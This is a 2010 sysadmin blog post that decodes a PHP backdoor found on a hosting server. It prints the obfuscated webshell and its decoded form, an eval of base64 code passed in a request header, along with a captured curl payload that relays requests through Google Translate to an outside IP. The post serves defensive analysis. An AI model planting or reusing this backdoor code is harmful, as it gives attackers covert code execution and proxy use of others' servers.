---
layout: post
status: publish
published: true
title: Unobfuscating an Attack
author:
  display_name: alanp
  login: admin
  email: github@laudicina.net
  url: ''
author_login: admin
author_email: github@laudicina.net
wordpress_id: 145
wordpress_url: http://alanp.ca/blog/?p=145
date: '2010-07-13 09:20:33 -0400'
date_gmt: '2010-07-13 13:20:33 -0400'
categories:
- Software
- System Administration
tags:
- php
- obfuscated
- hack
- hacker
- curl
- sysadmin
comments:
- id: 2124
  author: 'wp-popular.com &raquo; Blog Archive &raquo; Unobfuscating an Attack &laquo;
    alanp.ca : blog'
  author_email: ''
  author_url: http://wp-popular.com/popular-word-press-websites/unobfuscating-an-attack-%c2%ab-alanp-ca-blog/
  date: '2010-07-25 04:51:35 -0400'
  date_gmt: '2010-07-25 08:51:35 -0400'
  content: "[...] post: Unobfuscating an Attack &laquo; alanp.ca : blog Tags: code,
    hack, [...]"
- id: 2159
  author: Erin
  author_email: webkitech@gmail.com
  author_url: ''
  date: '2011-05-17 14:52:00 -0400'
  date_gmt: '2011-05-17 14:52:00 -0400'
  content: "&nbsp;This just happened to my wordpress account. I don't know much about
    hacks or viruses. I deleted the file (it overtook my style.css file). Is the problem
    solved now or should I take further action? Thanks!"
- id: 2226
  author: Xavier Schott
  author_email: xschott@gmail.com
  author_url: ''
  date: '2011-10-30 23:23:00 -0400'
  date_gmt: '2011-10-31 03:23:00 -0400'
  content: |-
    There are immediate actions you must take when you isolate an attack. The file which led to the infection likely multiplied itself in a few locations.

    As described in this article:
    http:&#47;&#47;thegothicparty.com&#47;dev&#47;article&#47;server-side-virus-rat&#47;

    you should take serious steps in not only identifying other potential backdoors or RAT, but also tighten the security on your server, starting with ensuring that absolutely no directory is writable, and your WordPress is up-to-date. There are known plug-in security holes, and your first line of response is robust, recent software.
---
<p><img class="alignleft size-full wp-image-190" title="Chomp Chomp, Hackers be biting your computar." src="http:&#47;&#47;alanp.ca&#47;blog&#47;wp-content&#47;uploads&#47;2010&#47;07&#47;chomp.png" alt="" width="48" height="48" &#47;>Having experienced some 'weird' traffic the other day, a client contacted me regarding this problem. &nbsp;One of the datacenters we deal with contacted my client and sent him the following logs from an attack that seems to occured from his server:</p>
<pre lang="C">access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:03 +0000] "GET &#47;wp-login.php HTTP&#47;1.1" 404 2533 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:03 +0000] "GET &#47;old&#47;wp-login.php HTTP&#47;1.1" 404 2533 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:04 +0000] "GET &#47;cms&#47;wp-login.php HTTP&#47;1.1" 404 2533 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:04 +0000] "GET &#47;wp-login.php HTTP&#47;1.1" 404 2537 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:05 +0000] "GET &#47;wp-login.php HTTP&#47;1.1" 404 2538 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:05 +0000] "GET &#47;blog&#47;wp-login.php HTTP&#47;1.1" 404 2537 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:06 +0000] "GET &#47;blog&#47;wp-login.php HTTP&#47;1.1" 404 2533 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:06 +0000] "GET &#47;blog_old&#47;wp-login.php HTTP&#47;1.1" 404 2533 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:06 +0000] "GET &#47;blog-old&#47;wp-login.php HTTP&#47;1.1" 404 2533 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)"<br />
access.log:xxx.xxx.xxx.xxx - - [01&#47;Jul&#47;2010:12:15:07 +0000] "GET &#47;blog&#47;wp&#47;wp-login.php HTTP&#47;1.1" 404 2533 "-" "Mozilla&#47;5.0 (compatible; Googlebot&#47;2.1; +http:&#47;&#47;www.google.com&#47;bot.html)<&#47;pre><br />
Obviously, the IPs have been removed to protect the innocent. &nbsp;What we can see from this log output is that there is an obvious scan of hackable Wordpress installations happening -- and they look to come from our server.</p>
<p>After some further inspection of the server, it looks as if an 'attacker' uploaded a PHP file to their account and was now using it to scour the internet for hackable Wordpress installs. &nbsp;A remote machine would send requests to a group of servers hosting this PHP file:</p>
<pre lang="PHP">$_fcxxxcc="\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65";<br />
$_fcxxxcc("\x7c\x2e\x7c\x65","\x65\x76\x61\x6c\x28\x27\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x22aWYobWQ1KCRfU0VSVkVSWydIVFRQX1FVT1RFJ10pPT0nZTY2ZTZjYWRkNmUxM2VmZWE1NGVkNTBjMGViMmQzMmInIGFuZCBpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0NPREUnXSkpIEBldmFsKEBiYXNlNjRfZGVjb2RlKHN0cnJldihAJF9TRVJWRVJbJ0hUVFBfWF9DT0RFJ10pKSk7\x22\x29\x29\x3b\x27\x29",'.');<&#47;pre><br />
I have to give it to them, at least they obfuscated the code. &nbsp;It took a while before I realized the extent of their hidden code. &nbsp;Unobfuscating this file gives us:</p>
<pre lang="PHP">$_fcxxxcc="preg_replace";<br />
preg_replace("|.|e","eval('eval(base64_decode("aWYobWQ1KCRfU0VSVkVSWydIVFRQX1FVT1RFJ10pPT0nZTY2ZTZjYWRkNmUxM2VmZWE1NGVkNTBjMGViMmQzMmInIGFuZCBpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0NPREUnXSkpIEBldmFsKEBiYXNlNjRfZGVjb2RlKHN0cnJldihAJF9TRVJWRVJbJ0hUVFBfWF9DT0RFJ10pKSk7"));')",'.')<&#47;pre><br />
Base 64 decoding this string gives us:</p>
<pre lang="PHP">if(md5($_SERVER['HTTP_QUOTE'])=='e66e6cadd6e13efea54ed50c0eb2d32b'  and isset($_SERVER['HTTP_X_CODE']))<br />
    @eval(@base64_decode(strrev(@$_SERVER['HTTP_X_CODE'])));<&#47;pre><br />
Finally, we're getting somewhere!</p>
<p>Brief inspection of this code shows that the attackers are sending a payload which gets interpreted by the local system. &nbsp;But, what kind of payload are they sending to their script? &nbsp;Since this file was being called quite periodically, dumping the information to a text file gives us all of the information we are looking for. &nbsp;After a day, I came back to check on the script to find payload that looks like this (decoding and comments by me):</p>
<pre lang="PHP">header("X_GZIP: TRUE");<br />
header("X_MD5: 8b72825b0b211b07f8378013cbfb0d17");<br />
error_reporting(E_ALL); ini_set("display_errors",1); $cr=curl_init();<br />
curl_setopt($cr, 13, unserialize(base64_decode("aToxNTs="))); &#47;&#47; i:15;<br />
curl_setopt($cr, 19913, unserialize(base64_decode("czoxOiIxIjs="))); &#47;&#47; s:1:"1";<br />
curl_setopt($cr, 42, unserialize(base64_decode("czoxOiIxIjs="))); &#47;&#47; s:1:"1";<br />
curl_setopt($cr, 53, unserialize(base64_decode("czoxOiIwIjs="))); &#47;&#47; s:1:"1";<br />
curl_setopt($cr, 52, unserialize(base64_decode("aTowOw=="))); &#47;&#47; i:0;<br />
curl_setopt($cr, 19914, unserialize(base64_decode("czoxOiIxIjs="))); &#47;&#47; s:1:"1";<br />
curl_setopt($cr, 64, unserialize(base64_decode("czoxOiIwIjs="))); &#47;&#47; s:1:"1";<br />
curl_setopt($cr, 81, unserialize(base64_decode("czoxOiIwIjs="))); &#47;&#47; s:1:"1";<br />
curl_setopt($cr, 10023, unserialize(base64_decode("YTo5OntpOjA7czoxMToiQWNjZXB0OiAqLyoiO2k6MTtzOjIyOiJBY2NlcHQtTGFuZ3VhZ2U6IGVuLXVzIjtpOjI7czoyMjoiQ29ubmVjdGlvbjoga2VlcC1hbGl2ZSI7aTozO3M6MTIwOiJVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBBVCZUIENTTTcuMDsgWVBDIDMuMi4wOyAuTkVUIENMUiAxLjEuNDMyMjsgeXBsdXMgNS4xLjA0YikiO2k6NDtzOjg6IkV4cGVjdDogIjtpOjU7czoxNzoiQWNjZXB0LUVuY29kaW5nOiAiO2k6NjtzOjE1OiJLZWVwLUFsaXZlOiAxMTUiO2k6NztzOjg6IkNvb2tpZTogIjtpOjg7czoxNDk6IlJlZmVyZXI6IGh0dHA6Ly90cmFuc2xhdGUuZ29vZ2xlLmNvbS90cmFuc2xhdGU&#47;aGw9ZW4mc2w9ZW4mdGw9ZnImdT1odHRwJTNBJTJGJTJGODkuMTQ5LjI0Mi4xMjIlMkZkYXRhJTJGMjk1NjA5M185M2NmODdjNGM1NGFlNjVjNjc0ZTlkOWJjOTQ3NjU3OS5odG1sIjt9")));<br />
&#47;* a:9:{i:0;s:11:"Accept: *&#47;*";i:1;s:22:"Accept-Language: en-us";i:2;s:22:"Connection: keep-alive";i:3;s:120:"User-Agent: Mozilla&#47;4.0 (compatible; MSIE 7.0; Windows NT 5.1; AT&amp;T CSM7.0; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.1.04b)";i:4;s:8:"Expect: ";i:5;s:17:"Accept-Encoding: ";i:6;s:15:"Keep-Alive: 115";i:7;s:8:"Cookie: ";i:8;s:149:"Referer: http:&#47;&#47;translate.google.com&#47;translate?hl=en&amp;sl=en&amp;tl=fr&amp;u=http%3A%2F%2F89.149.242.122%2Fdata%2F2956093_93cf87c4c54ae65c674e9d9bc9476579.html";} *&#47;<br />
curl_setopt($cr, 10102, unserialize(base64_decode("czowOiIiOw=="))); &#47;&#47; s:0:"";<br />
curl_setopt($cr, 47, unserialize(base64_decode("aTowOw=="))); &#47;&#47; i:0;<br />
curl_setopt($cr, 10002, unserialize(base64_decode("czoxNDA6Imh0dHA6Ly90cmFuc2xhdGUuZ29vZ2xlLmNvbS90cmFuc2xhdGU&#47;aGw9ZW4mc2w9ZW4mdGw9ZnImdT1odHRwJTNBJTJGJTJGODkuMTQ5LjI0Mi4xMjIlMkZkYXRhJTJGMjk1NjA5M185M2NmODdjNGM1NGFlNjVjNjc0ZTlkOWJjOTQ3NjU3OS5odG1sIjs=")));<br />
&#47;&#47; s:140:"http:&#47;&#47;translate.google.com&#47;translate?hl=en&amp;sl=en&amp;tl=fr&amp;u=http%3A%2F%2F89.149.242.122%2Fdata%2F2956093_93cf87c4c54ae65c674e9d9bc9476579.html";<br />
$response=curl_exec($cr);<br />
$md5_error=md5("error");$md5_content=md5("content");$md5_info=md5("info");<br />
if(is_bool($response) and $response == false) {<br />
    echo "<$md5_error>".curl_errno($cr)."|".curl_error($cr)."";<br />
    exit;<br />
}<br />
echo "<$md5_info>".serialize(curl_getinfo($cr))."";<br />
if(function_exists("gzdeflate") and base64_encode(gzdeflate(md5("time"),9))=="MzBPTjazNEmyTDJOSzYzNjM3NEhLNLBIMrM0Mko2MUoCAA=="){<br />
    $response="GZIP|".base64_encode(gzdeflate($response,9));<br />
}<br />
echo "<$md5_content>$response";<br />
exit;<&#47;pre><br />
The definition of the curl_setopt call is as follows:</p>
<p><span style="font-family: Consolas, Monaco, 'Courier New', Courier, monospace; line-height: 18px; font-size: 12px; white-space: pre;">bool curl_setopt ( resource $ch , int $option , mixed $value )<&#47;span></p>
<p>Let's break down all of the Curl options we are setting here. &nbsp;Even the <a href="http:&#47;&#47;php.net&#47;manual&#47;en&#47;function.curl-setopt.php">curl_setopt<&#47;a> calls are obfuscated in the xcode that we receive, using the integer value instead of the constants:</p>
<ul>
<li>Option 13 (<strong>CURLOPT_TIMEOUT<&#47;strong> => 15): Sets the timeout for the Curl request to 15 seconds.<&#47;li>
<li>Option 19913 (<strong>CURLOPT_RETURNTRANSFER<&#47;strong> => "1"): Returns the value of <a href="http:&#47;&#47;www.php.net&#47;manual&#47;en&#47;function.curl-exec.php">curl_exec<&#47;a> as a string.<&#47;li>
<li>Option 42 (<strong>CURLOPT_HEADER<&#47;strong> => "1"): Includes the header in the output.<&#47;li>
<li>Option 53 (<strong>CURLOPT_TRANSFERTEXT<&#47;strong> => "1"): Uses ASCII mode for FTP transfers.<&#47;li>
<li>Option 52 (<strong>CURLOPT_FOLLOWLOCATION<&#47;strong> => 0): Does not follow 'Location:' header fields.<&#47;li>
<li>Option 19914 (<strong>CURLOPT_BINARYTRANSFER<&#47;strong> => "1"): Returns raw output in conjunction with option 19913 (CURLOPT_RETURNTRANSFER)<&#47;li>
<li>Option 64 (<strong>CURLOPT_SSL_VERIFYPEER<&#47;strong> => "1"):&nbsp;Verifies&nbsp;the site's SSL certificate to be valid.<&#47;li>
<li>Option 81 (<strong>CURLOPT_SSL_VERIFYHOST<&#47;strong> => "1"): Verifies the correct SSL hostname for the certificate.<&#47;li>
<li>Option 10023 (<strong>CURLOPT_HTTPHEADER<&#47;strong>): Sets the HTTP header sent as follows:
<ul>
<li>"Accept: *&#47;*": Specifies that all media is acceptable for response from the HTTP request<&#47;li>
<li>"Accept-Language: en-us": Specifies that we are looking for an English return.<&#47;li>
<li>"Connection: keep-alive": Specifies that we want a persistent connection (multiple responses&#47;downloads in one thread of the server essentially).<&#47;li>
<li>"User-Agent: Mozilla&#47;4.0 (compatible; MSIE 7.0; Windows NT 5.1; AT&amp;amp;T CSM7.0; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.1.04b)": A bogus user agent<&#47;li>
<li>"Expect: ": Indicates that no behavior is required by the client.<&#47;li>
<li>"Accept-Encoding: ": Indicates that we accept all encoding.<&#47;li>
<li>"Keep Alive: 115": Sets a keep-alive timeout of 115.<&#47;li>
<li>"Referer: <cut for clarity: &nbsp;see in source above>": Sets a seemingly bogus referer, although this may be legit in some cases.<&#47;li><br />
<&#47;ul><br />
<&#47;li></p>
<li>Option 10102 (<strong>CURLOPT_ENCODING<&#47;strong> => ""): If this is set to "", a header that accepts all "Accept Encoding" header values is sent.<&#47;li>
<li>Option 47 (<strong>CURLOPT_POST<&#47;strong> => 0): We are not doing a HTTP post.<&#47;li>
<li>Option 10002 (<strong>CURLOPT_URL<&#47;strong>): Sets the URL to fetch.<&#47;li><br />
<&#47;ul><br />
If you would like to see a mapping of integer=>constant name for the curl curl options in PHP, you can <a href=" http:&#47;&#47;alanp.ca&#47;blog&#47;curl_setopt-numerical-values&#47;">find that here<&#47;a>.</p>
<p>It looks like in this case, the attacker was using Google Translate to fetch a website and translate it into another language. &nbsp;In this case, the payload of the attack is not as important as the implications of finding this file and the outcome it could have on your server and the users hosted on it.</p>
<p>I think the moral of the story here is to watch out for what your users may be uploading to your servers.  This two line file essentially turned one of our machines into an open proxy server for whoever was privy to the URL of this script.  It is better to be proactive in searching for these than it is to sit around and wait for a datacenter to give you a ring.  Of course, you can't always find them in time.</p>
<p><strong>References and Attributions:<&#47;strong></p>
<ol>
<li><a href="http:&#47;&#47;php.net&#47;manual&#47;en&#47;function.curl-setopt.php">PHP: curl_setopt<&#47;a><&#47;li>
<li><a href="http:&#47;&#47;php.net&#47;manual&#47;en&#47;function.curl-setopt.php"><&#47;a><a href="http:&#47;&#47;www.w3.org&#47;Protocols&#47;rfc2616&#47;rfc2616.html">RFC2616: Hypertext Transfer Protocol -- HTTP&#47;1.1<&#47;a><&#47;li>
<li>Chomped computer image at the top of the article is from the <a href="http:&#47;&#47;tango.freedesktop.org&#47;">Tango<&#47;a> project, modified by <a href="http:&#47;&#47;commons.wikimedia.org&#47;wiki&#47;User:Slady">slady<&#47;a>.  Licensed under the <a href="http:&#47;&#47;creativecommons.org&#47;">Creative Commons<&#47;a>-BY-SA-2.5 License.<&#47;li><br />
<&#47;ol></p>
